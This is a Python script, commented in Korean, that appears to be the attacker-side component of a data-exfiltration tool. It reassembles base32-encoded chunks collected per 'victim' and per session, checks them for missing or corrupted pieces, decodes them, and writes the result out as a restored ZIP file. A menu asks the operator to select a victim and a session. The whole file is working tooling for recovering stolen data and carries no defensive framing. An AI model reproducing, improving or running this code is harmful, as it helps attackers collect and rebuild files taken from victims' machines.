# rebuild_zip.py (데이터 무결성 검사 기능이 포함된 최종 완성본)

import os
import glob
import base64
import logging
import re # 문자 검사를 위해 re 모듈 추가

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("analyzer.log", mode='w'),
        logging.StreamHandler()
    ]
)

def get_sorted_chunks(session_dir):
    """청크 파일을 숫자 순서대로 정렬합니다."""
    try:
        chunk_files = glob.glob(os.path.join(session_dir, "chunk_*.b64"))
        if not chunk_files:
            return [], {}
        chunk_map = {int(os.path.basename(f).replace("chunk_", "").replace(".b64", "")): f for f in chunk_files}
        sorted_indices = sorted(chunk_map.keys())
        sorted_files = [chunk_map[i] for i in sorted_indices]
        return sorted_files, chunk_map
    except (ValueError, TypeError) as e:
        logging.error(f"Chunk 파일 정렬 중 오류 발생: {e}")
        return None, None

def decode_base32_chunks(chunk_files):
    """모든 청크를 검증하고, 합친 후, 디코딩합니다."""
    full_base32_string = ""
    logging.info(f"Reading and validating {len(chunk_files)} chunk files...")
    
    # Base32에 유효한 문자: A-Z, 2-7. 클라이언트가 보낸 'x' 플레이스홀더도 잠시 허용.
    # 대소문자 구분 없이 검사하기 위해 소문자로 통일
    valid_char_pattern = re.compile(r'^[a-z2-7x]+$')

    for i, chunk_file in enumerate(chunk_files):
        try:
            # [수정] UTF-8 인코딩을 명시하여 파일을 읽습니다.
            with open(chunk_file, "r", encoding="utf-8") as f:
                content = f.read().strip()
                if not content:
                    logging.warning(f"Chunk file {os.path.basename(chunk_file)} is empty. Skipping.")
                    continue

                # [추가] 각 청크 내용에 유효하지 않은 문자가 있는지 검사
                if not valid_char_pattern.match(content.lower()):
                    invalid_chars = re.sub(r'[a-z2-7x]', '', content.lower())
                    logging.error(f"CRITICAL: Invalid characters found in {os.path.basename(chunk_file)}: {list(set(invalid_chars))}")
                    logging.error("File rebuilding aborted due to data corruption.")
                    return None

                # [수정] 마지막 청크의 'x' 플레이스홀더 제거 로직 개선
                if i == len(chunk_files) - 1 and content.lower().endswith('x'):
                    logging.warning(f"Placeholder 'x' found and removed from the last chunk: {os.path.basename(chunk_file)}")
                    content = content[:-1]
                
                full_base32_string += content
        except Exception as e:
            logging.error(f"Error reading chunk file {chunk_file}: {e}")
            return None
    
    logging.info("All chunks validated and concatenated.")
    logging.info(f"Total concatenated string length: {len(full_base32_string)}")

    try:
        full_base32_string = full_base32_string.upper()
        padding_needed = (8 - len(full_base32_string) % 8) % 8
        full_base32_string += "=" * padding_needed
        
        decoded_data = base64.b32decode(full_base32_string)
        logging.info(f"Final decode successful. Total decoded size: {len(decoded_data)} bytes.")
        return bytes(decoded_data)
    except (ValueError, TypeError, base64.binascii.Error) as e:
        logging.error(f"Final Base32 decoding error: {e}")
        return None

# --- 이하 코드는 이전과 동일 (main, list_victims, list_sessions, rebuild_zip) ---
def rebuild_zip(victim_hash, session_id):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    base_dir = os.path.abspath(os.path.join(script_dir, '..'))
    results_dir = os.path.join(base_dir, "logs", "results", victim_hash, session_id)
    if not os.path.exists(results_dir): logging.error(f"Session directory not found: {results_dir}"); return
    chunk_files, chunk_map = get_sorted_chunks(results_dir)
    if chunk_files is None or not chunk_files: logging.error(f"No valid chunk files found or sorted in {results_dir}"); return
    chunk_indices = set(chunk_map.keys()); max_index = max(chunk_indices) if chunk_indices else -1
    missing_chunks = [i for i in range(max_index + 1) if i not in chunk_indices]
    if missing_chunks:
        logging.error(f"CRITICAL: {len(missing_chunks)} chunk(s) are missing! (e.g., {missing_chunks[:10]})"); return
    logging.info("Integrity check passed: No missing chunks found.")
    decoded_data = decode_base32_chunks(chunk_files)
    if decoded_data is None: logging.error("ZIP file rebuilding failed."); return
    output_dir_path = os.path.join(script_dir, "restored_zips"); os.makedirs(output_dir_path, exist_ok=True)
    output_filename = f"victim_{victim_hash}_{session_id}_restored.zip"
    output_path = os.path.join(output_dir_path, output_filename)
    try:
        with open(output_path, "wb") as f: f.write(decoded_data)
        logging.info("="*50); logging.info(f"  Successfully rebuilt ZIP file: {output_path}"); logging.info("="*50)
    except Exception as e:
        logging.error(f"Failed to write ZIP file {output_path}: {e}")

def list_victims(results_base_dir):
    if not os.path.isdir(results_base_dir): return []
    return [d for d in os.listdir(results_base_dir) if os.path.isdir(os.path.join(results_base_dir, d))]

def list_sessions(results_base_dir, victim_hash):
    sessions_dir = os.path.join(results_base_dir, victim_hash)
    if not os.path.isdir(sessions_dir): return []
    return [d for d in os.listdir(sessions_dir) if os.path.isdir(os.path.join(sessions_dir, d))]

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__)); base_dir = os.path.abspath(os.path.join(script_dir, '..')); results_base_dir = os.path.join(base_dir, "logs", "results")
    if not os.path.exists(results_base_dir): logging.error(f"Results directory not found: {results_base_dir}"); return
    victims = list_victims(results_base_dir)
    if not victims: logging.error("No victims found."); return
    print("\nAvailable victims:"); [print(f"{i}. {v}") for i, v in enumerate(victims, 1)]
    try:
        victim_choice_str = input("Select a victim by number: "); victim_choice = int(victim_choice_str) - 1
        if not (0 <= victim_choice < len(victims)): logging.error("Invalid victim selection."); return
        selected_victim = victims[victim_choice]
    except (ValueError, IndexError): logging.error("Invalid input."); return
    sessions = list_sessions(results_base_dir, selected_victim)
    if not sessions: logging.info(f"No sessions found for victim {selected_victim}."); return
    print(f"\nAvailable sessions for victim {selected_victim}:"); [print(f"{i}. {s}") for i, s in enumerate(sessions, 1)]
    try:
        session_choice_str = input("Select a session by number: "); session_choice = int(session_choice_str) - 1
        if not (0 <= session_choice < len(sessions)): logging.error("Invalid session selection."); return
        selected_session = sessions[session_choice]
    except (ValueError, IndexError): logging.error("Invalid input."); return
    logging.info(f"Rebuilding ZIP for victim {selected_victim}, session {selected_session}")
    rebuild_zip(selected_victim, selected_session)

if __name__ == "__main__":
    main()
